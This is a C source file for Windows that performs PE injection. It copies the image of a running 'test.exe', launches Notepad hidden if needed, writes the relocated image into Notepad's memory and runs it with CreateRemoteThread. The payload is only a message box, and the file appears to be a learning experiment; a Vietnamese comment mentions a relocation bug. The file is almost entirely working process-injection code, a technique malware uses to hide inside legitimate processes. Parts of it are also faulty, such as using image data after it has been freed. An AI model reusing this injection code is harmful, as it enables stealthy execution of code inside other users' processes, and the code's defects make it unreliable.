#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;


DWORD InjectionEntryPoint(LPVOID lpParameter) {
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", MB_OK);
    return 0;
}

// Function to get the PID of a process by its name
DWORD get_pid_by_name(const char *proc_name) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    DWORD pid = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed, error: %ld\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError());
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, proc_name) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return pid;
}

// Function to launch a process in a hidden state
void LaunchHiddenProcess(const char *processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, (LPSTR)processName, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcess failed, error: %lu\n", GetLastError());
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

DWORD RunAndPauseProcess(LPCSTR exePath) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create the process
    if (!CreateProcessA(exePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%lu).\n", GetLastError());
        return 0; // Return 0 to indicate failure
    }

    printf("Process started and paused. PID: %lu\n", pi.dwProcessId);

    // Close handles that are not needed
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Return the Process ID
    return pi.dwProcessId;
}

PVOID GetModuleBaseAddress(DWORD processID, const char* moduleName) {
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;

    // Get a handle to the process.
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (hProcess == NULL) {
        return NULL;
    }

    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            TCHAR szModName[MAX_PATH];

            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
                // Compare the module name with the desired module name.
                if (_tcsicmp(szModName, moduleName) == 0) {
                    // If found, return the base address.
                    CloseHandle(hProcess);
                    return (PVOID)hMods[i];
                }
            }
        }
    }

    // If the module is not found, return NULL.
    CloseHandle(hProcess);
    return NULL;
}

int main() {
    LPCSTR filename = "D:\\Workspace\\C++\\Injection\\test.exe";
    DWORD processID = get_pid_by_name("test.exe");

    if (processID == 0) {
        printf("Process not found.\n");
        return 1;
    }

    // Get the base address of "test.exe".
    PVOID imageBase = GetModuleBaseAddress(processID, filename);
    if(imageBase == 0) {
        printf("Error 1\n");
        CloseHandle(imageBase);
        return 1;
    }
    printf("Image Base: %p\n", imageBase);
    IMAGE_NT_HEADERS ntHeaderData;
    BYTE *imageData;

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, processID);

    //Read ntHeaderData and imageData
    if (hProcess != NULL) {
        IMAGE_DOS_HEADER dosHeader;
        SIZE_T bytesRead;
        if (ReadProcessMemory(hProcess, imageBase, &dosHeader, sizeof(dosHeader), &bytesRead)) {
            if (bytesRead == sizeof(dosHeader) && dosHeader.e_magic == IMAGE_DOS_SIGNATURE) {
                printf("DOS Header e_magic: 0x%x\n", dosHeader.e_magic);

                PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader.e_lfanew);

                if (ReadProcessMemory(hProcess, ntHeader, &ntHeaderData, sizeof(ntHeaderData), &bytesRead)) {
                    if (bytesRead == sizeof(ntHeaderData)) {
                        printf("Size Of Image: 0x%x\n", ntHeaderData.OptionalHeader.SizeOfImage);
                        SIZE_T imageSize = ntHeaderData.OptionalHeader.SizeOfImage;
                        imageData = (BYTE *)malloc(imageSize);
                        if (imageData) {
                                if (ReadProcessMemory(hProcess, imageBase, imageData, imageSize, &bytesRead)) {
                                    if (bytesRead == imageSize) {
                                        printf("Successfully read the entire image.\n");
                                        printf("\n");
                                    } else {
                                        printf("Failed to read the entire image.\n");
                                    }
                                } else {
                                    printf("Failed to read image memory.\n");
                                }
                                free(imageData);
                            } else {
                                printf("Failed to allocate memory for image data.\n");
                            }
                    } else {
                        printf("Failed to read NT Headers.\n");
                    }
                } else {
                    printf("Failed to read NT Headers memory.\n");
                }
            } else {
                printf("Invalid DOS Header.\n");
            }
        } else {
            printf("Failed to read DOS Header memory.\n");
        }
        CloseHandle(hProcess);
    } else {
        printf("Failed to open process for reading.\n");
    }

    //PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    //PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

    PVOID localImage = VirtualAlloc(NULL, ntHeaderData.OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageData, ntHeaderData.OptionalHeader.SizeOfImage);

    DWORD pid = get_pid_by_name("Notepad.exe");

    if (pid == 0) {
        LaunchHiddenProcess("Notepad.exe");
        Sleep(5000);
        pid = get_pid_by_name("Notepad.exe");
    }
    if (pid == 0)
        return 0;

    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeaderData.OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    //Lỗi k lấy được relocation table
    printf("Start relo!\n");
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeaderData.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    while (relocationTable->SizeOfBlock > 0) {
        DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        for (DWORD i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }
    printf("Finish relo!\n");

    if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeaderData.OptionalHeader.SizeOfImage, NULL)) {
        printf("Error 2\n");
        CloseHandle(imageBase);
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    DWORD_PTR injectionEntryPointAddress = (DWORD_PTR)imageBase + (DWORD_PTR)ntHeaderData.OptionalHeader.AddressOfEntryPoint + deltaImageBase;
    HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
    if (remoteThread == NULL) {
        printf("Error 3\n");
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(imageBase);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    printf("Success!\n");
    WaitForSingleObject(remoteThread, INFINITE);
    //Sleep(5000);

    CloseHandle(imageBase);
    CloseHandle(remoteThread);
    VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
    CloseHandle(targetProcess);
    VirtualFree(localImage, 0, MEM_RELEASE);

    return 0;
}
